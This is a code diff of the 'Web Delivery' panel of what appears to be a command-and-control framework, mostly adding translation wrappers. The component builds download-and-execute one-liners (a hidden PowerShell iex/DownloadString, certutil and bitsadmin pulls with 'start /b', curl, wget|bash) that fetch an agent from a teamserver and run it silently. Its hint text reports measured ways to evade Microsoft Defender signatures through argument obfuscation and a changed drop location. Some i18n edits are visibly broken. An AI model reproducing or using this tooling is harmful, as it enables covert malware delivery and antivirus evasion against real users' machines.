@@ -347,7 +347,7 @@ function CmdBlock({
               title={axf.disabled ? axf.disabledReason : '生成语义等价、字面不同的变体'}
               onClick={axf.onRun}
             >
-              {loading ? '混淆中…' : '参数混淆'}
+              {loading ? '混淆中…' : t('参数混淆')}
             </button>
           )}
           <button className="ghost wd-copy" onClick={onCopy}>{t('复制')}</button>
@@ -381,14 +381,14 @@ function CmdBlock({
               {done.issues.some(Boolean) && (
                 <div className="hint muted-hint">
                   标红的是语义被改坏的变体：混淆器偶尔会改掉 URL 里的路径段
-                  （实测把 <code>deliver</code> 写成 <code>delivebr</code>），命令照样跑、
+                  （实测把 <code>deliver</code> {t('写成')} <code>delivebr</code>），命令照样跑、
                   只是下不到东西 —— 这类坏法比语法错更难发现，所以逐条比对
                   归一化后的 URL。带标注的那几条别用。
                 </div>
               )}
               {axf.landing === 'ps' && (
                 <div className="hint muted-hint">
-                  本条整条都是 PowerShell 命令：变体请贴进 <b>PowerShell / Win+R</b> 执行。
+                  {t('This one is a full PowerShell command: paste variants into')} <b>PowerShell / Win+R</b> {t('to run.')}.
                   ⚠ PS 这一族的混淆收益本轮**没测出来**（明文集与混淆集都没被 Defender 拦），
                   别当成已证。
                 </div>
@@ -548,7 +548,7 @@ export function WebDelivery() {
       // shots/opts-linux.png：表单是 Linux Agent / TestWSS / Binary ELF，
       // 这行却写着 Agent beacon · 格式 Exe · 监听 http）。
       setStatusText(
-        `服务端当前配置：缓存 ${st.cache_entries ?? 0} 条 · 监听 ${st.listener || '-'} · Agent ${st.agent_name || '-'} · 格式 ${st.format || '-'}`,
+        `Server config: cache ${st.cache_entries ?? 0} · listener ${st.listener || '-'} · agent ${st.agent_name || '-'} · format ${st.format || '-'}`,
       )
     } catch (e: any) {
       const msg = e?.message || String(e)
@@ -662,7 +662,7 @@ export function WebDelivery() {
     return [
       {
         id: 'ps-cmd',
-        label: 'PowerShell · cmd / 运行（推荐）',
+        label: t('PowerShell · cmd / 运行（推荐）'),
         short: 'PS/cmd',
         core: `powershell -nop -w hidden -c "${psPre}iex((New-Object Net.WebClient).DownloadString('${scriptPs}'))"`,
         post: '',
@@ -671,7 +671,7 @@ export function WebDelivery() {
       },
       {
         id: 'ps-native',
-        label: 'PowerShell · 已在 PS 内（单引号防 $ 展开）',
+        label: t('PowerShell · 已在 PS 内（单引号防 $ 展开）'),
         short: 'PS 内嵌',
         core: `powershell -nop -w hidden -c '${psPre}iex((New-Object Net.WebClient).DownloadString(''${scriptPs}''))'`,
         post: '',
@@ -693,14 +693,14 @@ export function WebDelivery() {
       // 里面一个 `%` 都没有，所以 `%USERPROFILE%` 一定原样展开（实测 15/15）。
       {
         id: 'certutil',
-        label: 'certutil 直拉 EXE',
+        label: t('certutil 直拉 EXE'),
         short: 'certutil',
         core: `certutil -urlcache -split -f ${payloadUrl}`,
         post: ` ${u}`,
         tail: `&& start /b "" ${u}`,
         landing: 'cmd',
         // 与混淆无关：certutil 没有「跳过证书校验」开关，实测明文就失败
-        warn: 'certutil 无法跳过证书校验，对自签证书的 teamserver 必然失败（实测 0x80072F8F）。仅当证书受信时可用。',
+        warn: 'certutil cannot skip cert validation — it always fails against a self-signed teamserver (0x80072F8F). Only usable with a trusted cert.',
       },
       {
         id: 'bitsadmin',
@@ -710,11 +710,11 @@ export function WebDelivery() {
         post: ` ${b}`,
         tail: `& start /b "" ${b}`,
         landing: 'cmd',
-        warn: 'bitsadmin 同样无法跳过证书校验（实测 0x80072F0D）。仅当证书受信时可用。',
+        warn: t('bitsadmin likewise cannot skip cert validation (0x80072F0D). Only usable with a trusted cert.'),
       },
       {
         id: 'curl',
-        label: 'curl.exe（Win10+ 自带）',
+        label: 'curl.exe (Win10+ built-in)',
         short: 'curl.exe',
         // Win10+ 自带 curl.exe；-k 跳过自签。
         // ★ `-o` 写在 **URL 之后**：这样输出路径才能留在 post 段。
@@ -747,7 +747,7 @@ export function WebDelivery() {
 
   async function onApply() {
     if (!listener) {
-      pushToast('warn', '请先选择监听器')
+      pushToast('warn', t('请先选择监听器'))
       return
     }
     if (!scriptRoute.startsWith('/') || !payloadRoute.startsWith('/')) {
@@ -781,7 +781,7 @@ export function WebDelivery() {
         c2_host_url: c2Host.trim(),
         arch: arch || '',
       } as any)
-      pushToast('ok', 'Web Delivery 配置已应用')
+      pushToast('ok', t('Web Delivery 配置已应用'))
       pushLog('ok', `WebDelivery 已同步 listener=${listener} agent=${agentName} format=${format} arch=${arch || 'auto'}`)
       await loadStatus()
     } catch (e: any) {
@@ -796,7 +796,7 @@ export function WebDelivery() {
 
   async function copy(text: string, label: string) {
     const ok = await copyText(text)
-    pushToast(ok ? 'ok' : 'err', ok ? `已复制${label}` : '复制失败')
+    pushToast(ok ? 'ok' : 'err', ok ? `已复制${label}` : t('复制失败'))
   }
 
   /**
@@ -851,7 +851,7 @@ export function WebDelivery() {
         ? `${tok} 不在服务端的 ${axfMeta.cmds.size} 个参数模型里，混淆一定失败`
         : axfMeta.reason,
       onRun: () => { runAxf(e).catch(() => {}) },
-      onCopyVariant: (v: string, i: number) => copy(variantCommand(e, v), ` ${e.short} 变体 ${i + 1}`),
+      onCopyVariant: (v: string, i: number) => copy(variantCommand(e, v), ` ${e.short} ${t('variant')} ${i + 1}`),
       finalText: (v: string) => variantCommand(e, v),
     }
   }
@@ -875,7 +875,7 @@ export function WebDelivery() {
           <div className="card-bd gen-body">
             {pluginMissing && (
               <div className="hint warn-hint" style={{ marginBottom: 12 }}>
-                服务端未加载 <b>webdelivery</b> 插件（<code>dist/extenders/webdelivery/</code>）。
+                服务端未加载 <b>webdelivery</b> {t('插件（')}<code>dist/extenders/webdelivery/</code>）。
                 确认 profile 已启用该 service，并已编译 so 后从 dist 重启 teamserver。
               </div>
             )}
@@ -883,14 +883,14 @@ export function WebDelivery() {
             {/* 原来这里写的是"按监听自动选 Agent：…"，那描述的是已经删掉的反推逻辑。
                 真实方向是反的，照原样留着会让操作员以为点了监听能换 agent。 */}
             <div className="hint muted-hint" style={{ marginBottom: 10 }}>
-              先选 <b>Agent</b>，下面的监听按兼容性过滤。一个监听可以配多种 Agent：
+              {t('Pick an')} <b>Agent</b>{t(' first — listeners below are filtered for compatibility. One listener can serve multiple agents:')}
               GopherTCP 同时可配 gopher / Linux Agent / macOS Agent，BeaconWS 可配 beacon / Linux Agent。
             </div>
 
             <div className="gen-section-title">{t('1. 投递路由')}</div>
             <div className="field-grid-2">
               <div className="field">
-                <label>Script 路由</label>
+                <label>{t('Script 路由')}</label>
                 <input value={scriptRoute} onChange={(e) => setScriptRoute(e.target.value)} placeholder="/deliver" />
               </div>
               <div className="field">
@@ -903,10 +903,10 @@ export function WebDelivery() {
               <input
                 value={c2Host}
                 onChange={(e) => setC2Host(e.target.value)}
-                placeholder="https://<teamserver 地址>:<端口>/api"
+                placeholder={t('https://<teamserver 地址>:<端口>/api')}
               />
               <div className="dim" style={{ fontSize: 11, marginTop: 4 }}>
-                one-liner 拼：<code className="mono">{scriptUrl || '…'}</code>
+                {t('one-liner built with:')}<code className="mono">{scriptUrl || '…'}</code>
               </div>
             </div>
 
@@ -935,7 +935,7 @@ export function WebDelivery() {
 
             {compatible.length === 0 ? (
               <div className="hint warn-hint">
-                没有兼容监听器（需要 {profile.listeners.join(' / ')}）
+                t('没有兼容监听器（需要') {profile.listeners.join(' / ')}）
                 <button className="ghost" style={{ marginLeft: 8 }} onClick={() => { setTab('listeners'); openUiTab('listeners') }}>
                   去创建
                 </button>
@@ -974,14 +974,14 @@ export function WebDelivery() {
                 </div>
                 {agentName === 'beacon' && format === 'Stager' && (
                   <div className="hint muted-hint" style={{ marginTop: 6 }}>
-                    Stager：小加载器需再访问 payload 路由拉取。日常一键上线建议用 <b>Exe</b>。
+                    {t('Stager: the small loader fetches from the payload route. Prefer')} <b>Exe</b> {t('for daily one-liners.')}.
                   </div>
                 )}
               </div>
               <div className="field">
-                <label>{t('架构（空=按 UA 自动）')}</label>
+                <label>{t('架构（空=按 UA auto）')}</label>
                 <div className="chip-row">
-                  <button type="button" className={!arch ? 'primary' : ''} onClick={() => setArch('')}>自动</button>
+                  <button type="button" className={!arch ? 'primary' : ''} onClick={() => setArch('')}>{t('自动')}</button>
                   {arches.map((a) => (
                     <button key={a} type="button" className={arch === a ? 'primary' : ''} onClick={() => setArch(a)}>{a}</button>
                   ))}
@@ -997,7 +997,7 @@ export function WebDelivery() {
                   "Reconnect timeout / count 相关" —— 它承诺两个旋钮（timeout 和 count），
                   而这一格绑的只有一个 sleep，count 根本没有对应的字段可发。 */}
               <div className="field">
-                <label>{sleepSpec.kind === 'sleep' ? 'Sleep / Jitter' : '重连间隔（秒）'}</label>
+                <label>{sleepSpec.kind === 'sleep' ? 'Sleep / Jitter' : t('重连间隔（秒）')}</label>
                 <div style={{ display: 'flex', gap: 8 }}>
                   <input
                     style={{ flex: 1 }}
@@ -1013,13 +1013,13 @@ export function WebDelivery() {
                       style={{ width: 90 }}
                       value={jitter}
                       onChange={(e) => setJitter(Number(e.target.value))}
-                      title="抖动%"
+                      title={t('抖动%')}
                     />
                   )}
                 </div>
               </div>
               <div className="field">
-                <label>缓存 TTL（分钟，0=不缓存）</label>
+                <label>{t('缓存 TTL（分钟，0=不缓存）')}</label>
                 <input
                   type="number"
                   min={0}
@@ -1032,9 +1032,9 @@ export function WebDelivery() {
 
             <div className="btns" style={{ marginTop: 12 }}>
               <button className="primary" style={{ minWidth: 140 }} disabled={busy || !listener} onClick={onApply}>
-                {busy ? '同步中…' : '应用并同步'}
+                {busy ? '同步中…' : t('应用并同步')}
               </button>
-              <button disabled={busy} onClick={() => loadStatus()}>刷新状态</button>
+              <button disabled={busy} onClick={() => loadStatus()}>{t('刷新状态')}</button>
             </div>
 
             {/* 这里原来还追加了「· {选中监听的 reg_name}」和「· 缓存 N」两截 ——
@@ -1050,17 +1050,17 @@ export function WebDelivery() {
         </div>
 
         <aside className="gen-side card">
-          <div className="card-hd"><h3>投递入口</h3></div>
+          <div className="card-hd"><h3>{t('投递入口')}</h3></div>
           <div className="card-bd" style={{ padding: 14 }}>
             <div className="gen-summary" style={{ marginBottom: 12 }}>
               <div><span className="k">Agent</span><b>{agentName}</b></div>
               <div><span className="k">{t('格式')}</span><b>{format}</b></div>
-              <div><span className="k">{t('架构')}</span><b className="mono">{arch || 'UA 自动'}</b></div>
-              <div><span className="k">{t('监听')}</span><b className="mono">{listener || '未选'}</b></div>
+              <div><span className="k">{t('架构')}</span><b className="mono">{arch || 'UA auto'}</b></div>
+              <div><span className="k">{t('监听')}</span><b className="mono">{listener || t('未选')}</b></div>
             </div>
 
             <div className="hint muted-hint" style={{ marginBottom: 10 }}>
-              产品级多入口：目标执行后由服务端按 <b>UA / ?d= / ?arch=</b> 返回对应 OS·架构载荷。
+              {t('Production multi-entry: the server returns the matching OS·arch payload by')} <b>UA / ?d= / ?arch=</b>.
               beacon 仅 Windows；gopher 按 UA 出 Win/Linux/macOS；linux 仅 ELF。
             </div>
 
@@ -1080,19 +1080,19 @@ export function WebDelivery() {
                 {/* 收益只有这一句是有 A/B 支撑的，就按实测说。PS 那一族本轮两组都没被
                     检测出来，所以明写「未测出」—— 不写成「都能过」，那是外推。 */}
                 <div className="hint muted-hint" style={{ marginTop: 10 }}>
-                  <b>{t('参数混淆')}</b>把命令的参数写法打乱重排：语义不变、字面不同。
-                  实测同一 URL 的 <code>certutil -urlcache -split -f …</code>，明文
-                  <b> 3/3 </b>被 Defender 按命令行签名拦下（<code>Trojan:Win32/Ceprolad.A</code>，
-                  载荷一个字节都没下来），同命令的 5 个混淆变体 <b>5/5</b> 跑起来了；
-                  curl 那条端到端下到过 <b>76312B 的 x64 载荷</b>。
-                  混淆区只含下载段，输出路径留在区外 —— 实测 <code>%USERPROFILE%</code> 展开 15/15。
-                  落点已从 <code>%TEMP%</code> 改为 <code>%USERPROFILE%</code>：实测
-                  <code>%TEMP%</code> × <code>.exe</code> × <code>&amp;&amp; start</code> 是
-                  <b>{t('命令行')}</b>签名 <code>Trojan:Win32/Commando.A!ml</code> 的触发合取
-                  （交错 A/B：<code>%TEMP%</code> 拦 4/4、<code>%USERPROFILE%</code> 拦 0/4）。
-                  ⚠ 但<b>真实载荷</b>在 <code>%USERPROFILE%</code> 上仍被同一签名记过 3 次，
-                  而良性替身复现不出来（约 30 次运行 0 检测）⇒ 换落点<b>必要但不充分</b>，别当成已修完。
-                  ⚠ PowerShell 那三条本轮两组都没被检测，收益<b>未测出</b>，别当成已证。
+                  <b>ArgFuscator</b> rewrites argument syntax — same semantics, different literals.
+                  Measured on the same URL with <code>certutil -urlcache -split -f …</code>: plaintext was
+                  <b> 3/3 </b>blocked by Defender on a cmdline signature (<code>Trojan:Win32/Ceprolad.A</code>,
+                  zero payload bytes delivered), while all 5 obfuscated variants <b>5/5</b> ran;
+                  the curl entry end-to-end delivered a <b>76312B x64 payload</b>.
+                  The obfuscated region covers only the download segment — the output path stays outside; measured <code>%USERPROFILE%</code> expansion 15/15.
+                  Drop location moved from <code>%TEMP%</code> to <code>%USERPROFILE%</code>: measured
+                  <code>%TEMP%</code> × <code>.exe</code> × <code>&amp;&amp; start</code> is the
+                  cmdline-<b>signature</b> <code>Trojan:Win32/Commando.A!ml</code> trigger conjunction
+                  (interleaved A/B: <code>%TEMP%</code> blocked 4/4, <code>%USERPROFILE%</code> 0/4).
+                  ⚠ But the <b>real payload</b> was still flagged 3× under <code>%USERPROFILE%</code> by the same signature,
+                  while a benign stand-in never reproduces it (0 detections in ~30 runs) ⇒ changing the drop location is <b>necessary but not sufficient</b> — not fully fixed.
+                  ⚠ The three PowerShell entries showed no detections in either group this round: benefit <b>unmeasured</b>, not proven.
                 </div>
               </>
             )}
@@ -1105,7 +1105,7 @@ export function WebDelivery() {
                 <CmdBlock label="wget | bash" value={linuxWget}
                   onCopy={() => copy(linuxWget, ' wget|bash')} />
                 <CmdBlock label="curl 直拉二进制" value={linuxCurlDirect}
-                  onCopy={() => copy(linuxCurlDirect, ' curl 直拉')} />
+                  onCopy={() => copy(linuxCurlDirect, ' curl pull')} />
                 <CmdBlock label="python3 直拉" value={linuxPython}
                   onCopy={() => copy(linuxPython, ' python3')} />
               </>
@@ -1113,14 +1113,14 @@ export function WebDelivery() {
 
             {agentName === 'beacon' && (
               <div className="hint muted-hint" style={{ marginTop: 12 }}>
-                当前 Agent=beacon → 只展示 Windows 入口。换 gopher/linux 可看 *nix 命令。
-                服务端仍按 UA 出 x64/x86；可在左侧固定架构。
+                Current agent = beacon → Windows entries only. Switch to gopher/linux for *nix commands.
+                The server still picks x64/x86 by UA; pin the arch on the left.
               </div>
             )}
 
             <div className="hint" style={{ marginTop: 12 }}>
-              链路：one-liner → <code>/deliver</code>（脚本）→ <code>/deliver/payload</code>（按 UA 架构出包）→ 静默执行。
-              直拉类跳过脚本层，直接打 payload。确保 <b>C2 Host</b> 与监听 callback 可达。
+              Chain: one-liner → <code>/deliver</code> (script) → <code>/deliver/payload</code> (UA-arch package) → silent exec.
+              {t('Direct-pull entries skip the script layer and hit the payload route. Make sure')} <b>C2 Host</b> {t('and the listener callback are reachable.')}.
             </div>
             <button style={{ width: '100%', marginTop: 10 }} onClick={() => { setTab('listeners'); openUiTab('listeners') }}>
               管理监听器
